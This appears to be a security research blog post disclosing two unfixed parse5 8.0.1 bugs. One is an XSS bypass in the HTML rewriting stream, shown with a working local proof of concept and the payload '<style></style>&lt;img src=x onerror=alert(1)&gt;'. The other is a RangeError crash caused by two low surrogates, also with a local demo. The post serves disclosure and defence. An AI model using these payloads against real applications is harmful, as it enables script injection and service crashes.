---
layout: post
title: "Two parse5 bugs: text turning into HTML, and a two-character crash"
tags: [security, vuln_research, web_platform]
description: "parse5's HTML rewriter can turn entity-encoded text into executable markup after a script or style element, even when a filter removes those tags. Separately, two consecutive low surrogates can make its HTML parser throw a RangeError. Both bugs remain in the latest release, 8.0.1."
---

[parse5](https://github.com/inikulin/parse5) is an HTML parser for JavaScript, used by projects like jsdom and Cheerio. Alongside the parser itself, it has a streaming HTML rewriter: listen for tags or text, modify them, and write them back out.

I found two bugs in it, which were reported in August, but are unfixed. One lets text turn into executable HTML during rewriting. The other makes the parser throw on a string containing two consecutive low surrogates. Both reproduce in version 8.0.1.

---

## XSS filter bypass

The rewriter, `parse5-html-rewriting-stream`, exposes an `emitText()` method for writing text tokens back into the output. Normally, it escapes characters like `<` and `&`. Inside elements such as `<style>` or `<script>`, though, text needs different treatment: character references aren't decoded there, so escaping the text would change its meaning.

To decide which treatment to use, [`emitText()` checks the tokenizer's last start tag](https://github.com/inikulin/parse5/blob/0d56627fc924d40f560fd260ade0e1a935e2369c/packages/parse5-html-rewriting-stream/lib/index.ts#L138):

```ts
public emitText({ text }: Text): void {
    this.push(
        !this.parserFeedbackSimulator.inForeignContent &&
            html.hasUnescapedText(this.tokenizer.lastStartTagName, true)
            ? text
            : escapeText(text),
    );
}
```

The problem is that the last start tag isn't necessarily the element we're still inside. After `<script></script>`, `lastStartTagName` still says `script`. The tokenizer has returned to its normal DATA state and will decode character references, but the rewriter still thinks it should emit text without escaping it.

So this:

```html
<script></script>&lt;img src=x onerror=alert(1)&gt;
```

becomes this:

```html
<script></script><img src=x onerror=alert(1)>
```

The input contains an empty script element followed by text that looks like an image tag. The output contains an actual image element with an event handler. The same thing happens after `<style></style>`.

### Removing the tags doesn't help

An application accepting arbitrary script elements already has a problem, but the interesting case is a filter that removes them.

Here's a local HTTP example. The attacker controls the `html` field in a JSON request. The server applies a simple tag allowlist: it permits only `<p>`, removes its attributes, and writes text through `emitText()`.

```sh
npm install parse5-html-rewriting-stream@8.0.1
node --input-type=module <<'EOF'
import { RewritingStream } from 'parse5-html-rewriting-stream';
import { createServer } from 'node:http';

function filter(html) {
    return new Promise((resolve, reject) => {
        const rw = new RewritingStream();
        let output = '';

        rw.on('startTag', token => {
            if (token.tagName === 'p') rw.emitStartTag({ ...token, attrs: [] });
        });
        rw.on('endTag', token => {
            if (token.tagName === 'p') rw.emitEndTag(token);
        });
        rw.on('text', token => rw.emitText(token));
        rw.on('data', chunk => { output += chunk; });
        rw.on('end', () => resolve(output));
        rw.on('error', reject);
        rw.end(html);
    });
}

const server = createServer(async (request, response) => {
    const chunks = [];
    for await (const chunk of request) chunks.push(chunk);
    const { html } = JSON.parse(Buffer.concat(chunks).toString());
    response.setHeader('Content-Type', 'text/html; charset=utf-8');
    response.end(await filter(html));
});

server.listen(0, '127.0.0.1', async () => {
    try {
        const attackerHtml = '<style></style>&lt;img src=x onerror=alert(1)&gt;';
        const response = await fetch(`http://127.0.0.1:${server.address().port}`, {
            method: 'POST',
            body: JSON.stringify({ html: attackerHtml }),
        });
        console.log('Attacker sent:', attackerHtml);
        console.log('Server returned:', await response.text());
    } finally {
        server.close();
    }
});
EOF
```

Output:

```text
Attacker sent: <style></style>&lt;img src=x onerror=alert(1)&gt;
Server returned: <img src=x onerror=alert(1)>
```

The start-tag handler only sees `style`, which it drops. It never sees an `img` tag or an `onerror` attribute: those arrive as the contents of a text token. By the time they become markup, the tag and attribute checks are over. Dropping the style tags from the output doesn't undo the tokenizer's state.

## Uncaught exception from two low surrogates

JavaScript strings use UTF-16 code units. A valid surrogate pair consists of a high surrogate, in the range `0xD800`–`0xDBFF`, followed by a low surrogate, in the range `0xDC00`–`0xDFFF`. Together, they represent one Unicode code point above `0xFFFF`.

JavaScript also lets a string contain unpaired surrogates (because of course). The parser needs to handle those without treating them as valid pairs.

In parse5's preprocessor, [`_processSurrogate()` looks at the next code unit](https://github.com/inikulin/parse5/blob/0d56627fc924d40f560fd260ade0e1a935e2369c/packages/parse5/lib/tokenizer/preprocessor.ts#L74):

```ts
const nextCp = this.html.charCodeAt(this.pos + 1);

if (isSurrogatePair(nextCp)) {
    this.pos++;
    this._addGap();

    return getSurrogatePairCodePoint(cp, nextCp);
}
```

Despite its name, `isSurrogatePair()` only checks whether its argument is a low surrogate. Nothing in this branch verifies that the current code unit, `cp`, is a high surrogate. Two consecutive low surrogates therefore get combined as though they were a valid pair.

For `0xDC00, 0xDC00`, the calculation produces `0x110000`. That's one above the maximum Unicode code point, `0x10FFFF`. In version 8.0.1, the value reaches `String.fromCodePoint()` while emitting text, which throws a `RangeError`.

This PoC accepts HTML from an HTTP request body. The attacker sends JSON containing `\udc00\udc00`; `JSON.parse()` turns those escapes into two low-surrogate code units before the server calls parse5. The handler catches the exception so the demonstration can print it and exit cleanly:

```sh
npm install parse5@8.0.1
node --input-type=module <<'EOF'
import { createServer } from 'node:http';
import { parse } from 'parse5';

const server = createServer(async (request, response) => {
    const chunks = [];
    for await (const chunk of request) chunks.push(chunk);

    try {
        const { html } = JSON.parse(Buffer.concat(chunks).toString());
        parse(html);
        response.end('PARSE_OK');
    } catch (error) {
        response.statusCode = 500;
        response.end(`${error.name}: ${error.message}`);
    }
});

server.listen(0, '127.0.0.1', async () => {
    try {
        const attackerJson = '{"html":"<div>\\udc00\\udc00</div>"}';
        const response = await fetch(`http://127.0.0.1:${server.address().port}`, {
            method: 'POST',
            body: attackerJson,
        });
        console.log('Attacker sent:', attackerJson);
        console.log('HTTP status:', response.status);
        console.log('Server returned:', await response.text());
    } finally {
        server.close();
    }
});
EOF
```

Output:

```text
Attacker sent: {"html":"<div>\udc00\udc00</div>"}
HTTP status: 500
Server returned: RangeError: Invalid code point 1114112
```

`parseFragment()` throws the same exception for this input. The `<div>` wrapper isn't needed in 8.0.1; the two code units alone are enough.
